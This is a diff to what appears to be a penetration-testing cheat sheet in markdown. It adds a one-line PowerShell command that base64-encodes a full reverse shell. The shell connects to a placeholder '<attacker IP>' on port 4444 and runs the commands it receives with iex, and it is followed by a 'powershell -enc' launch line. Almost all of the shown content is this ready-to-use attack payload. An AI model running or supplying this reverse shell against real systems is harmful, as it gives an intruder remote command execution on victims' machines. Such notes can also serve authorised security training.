@@ -51,6 +51,10 @@ $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 $EncodedText =[Convert]::ToBase64String($Bytes)
 $EncodedText
 ```
+And now all in one line:
+```powershell
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$client = New-Object System.Net.Sockets.TCPClient("<attacker IP>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'))
+```
 ```bash
 powershell -enc <our Base64 encoded Powershell revshell>
 ```
